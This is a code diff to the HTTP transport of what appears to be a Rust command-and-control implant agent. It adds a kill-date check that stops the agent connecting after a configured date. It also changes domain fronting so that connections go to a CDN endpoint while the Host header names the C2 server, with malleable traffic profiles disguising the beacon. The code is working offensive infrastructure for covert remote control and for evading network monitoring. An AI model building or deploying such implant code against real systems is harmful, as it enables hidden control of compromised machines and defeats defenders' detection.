@@ -27,6 +27,56 @@ use common::config::MalleableProfile;
 use common::{CryptoSession, Message, Transport};
 use tokio::time::Duration;
 
+/// Verify that the current date is before the kill date.
+/// `kill_date` must be in `YYYY-MM-DD` format (UTC).
+fn check_kill_date(kill_date: &str) -> Result<()> {
+    check_kill_date_pub(kill_date)
+}
+
+/// Public wrapper around kill-date enforcement used by `Agent::new()` (4-2).
+pub fn check_kill_date_pub(kill_date: &str) -> Result<()> {
+    // Parse as YYYY-MM-DD; produce a comparable 8-digit integer YYYYMMDD.
+    let parts: Vec<&str> = kill_date.splitn(3, '-').collect();
+    if parts.len() != 3 {
+        anyhow::bail!("invalid kill_date format '{}'; expected YYYY-MM-DD", kill_date);
+    }
+    let y: u32 = parts[0].parse().map_err(|_| anyhow!("invalid kill_date year"))?;
+    let m: u32 = parts[1].parse().map_err(|_| anyhow!("invalid kill_date month"))?;
+    let d: u32 = parts[2].parse().map_err(|_| anyhow!("invalid kill_date day"))?;
+    let kd_val = y * 10_000 + m * 100 + d;
+
+    // Derive today's date from the Unix epoch (UTC, no external deps).
+    let secs = std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .unwrap_or_default()
+        .as_secs();
+    let days_since_epoch = secs / 86400;
+    // Compute year/month/day from days_since_epoch (proleptic Gregorian, UTC).
+    let (ty, tm, td) = days_to_ymd(days_since_epoch);
+    let today_val = ty * 10_000 + tm * 100 + td;
+
+    if today_val >= kd_val {
+        anyhow::bail!("kill date {} has passed; agent refusing to connect", kill_date);
+    }
+    Ok(())
+}
+
+/// Convert days since the Unix epoch (1970-01-01) to (year, month, day).
+fn days_to_ymd(days: u64) -> (u32, u32, u32) {
+    // Algorithm: http://howardhinnant.github.io/date_algorithms.html#civil_from_days
+    let z = days as i64 + 719468;
+    let era = if z >= 0 { z } else { z - 146096 } / 146097;
+    let doe = (z - era * 146097) as u64;
+    let yoe = (doe - doe / 1460 + doe / 36524 - doe / 146096) / 365;
+    let y = yoe as i64 + era * 400;
+    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
+    let mp = (5 * doy + 2) / 153;
+    let d = doy - (153 * mp + 2) / 5 + 1;
+    let m = if mp < 10 { mp + 3 } else { mp - 9 };
+    let y = if m <= 2 { y + 1 } else { y };
+    (y as u32, m as u32, d as u32)
+}
+
 pub struct HttpTransport {
     profile: MalleableProfile,
     client: reqwest::Client,
@@ -35,9 +85,10 @@ pub struct HttpTransport {
 
 impl HttpTransport {
     pub async fn new(profile: &MalleableProfile, session: CryptoSession) -> Result<Self> {
-        // Enforce kill date check if implemented in profile (assuming kill_date is String/u64)
-        // if let Some(kd) = profile.kill_date { check... }
-
+        // Enforce kill date: refuse to connect after the configured date (4-2).
+        if !profile.kill_date.is_empty() {
+            check_kill_date(&profile.kill_date)?;
+        }
         // Malleable profile headers
         let mut headers = reqwest::header::HeaderMap::new();
         headers.insert(
@@ -115,8 +166,15 @@ impl Transport for HttpTransport {
         );
 
         let endpoint = if self.profile.cdn_relay {
-            // Domain-fronting: connect to CDN IP/host, Host header points to C2.
-            format!("https://{}", self.profile.host_header)
+            // Domain fronting: TCP connection goes to the CDN endpoint,
+            // while the Host HTTP header carries the C2 domain (set in new()).
+            if self.profile.cdn_endpoint.is_empty() {
+                anyhow::bail!(
+                    "cdn_relay is enabled but cdn_endpoint is not set; \
+                     configure the CDN relay address in the malleable profile"
+                );
+            }
+            format!("https://{}", self.profile.cdn_endpoint)
         } else {
             // Direct C2: operator must configure direct_c2_endpoint.
             if self.profile.direct_c2_endpoint.is_empty() {
@@ -146,7 +204,15 @@ impl Transport for HttpTransport {
         log::debug!("Malleable HTTP C2 Recv polling via GET");
 
         let endpoint = if self.profile.cdn_relay {
-            format!("https://{}", self.profile.host_header)
+            // Domain fronting: TCP connection goes to the CDN endpoint,
+            // while the Host HTTP header carries the C2 domain (set in new()).
+            if self.profile.cdn_endpoint.is_empty() {
+                anyhow::bail!(
+                    "cdn_relay is enabled but cdn_endpoint is not set; \
+                     configure the CDN relay address in the malleable profile"
+                );
+            }
+            format!("https://{}", self.profile.cdn_endpoint)
         } else {
             if self.profile.direct_c2_endpoint.is_empty() {
                 anyhow::bail!("direct_c2_endpoint is not configured; set it in the malleable profile for non-CDN deployments");
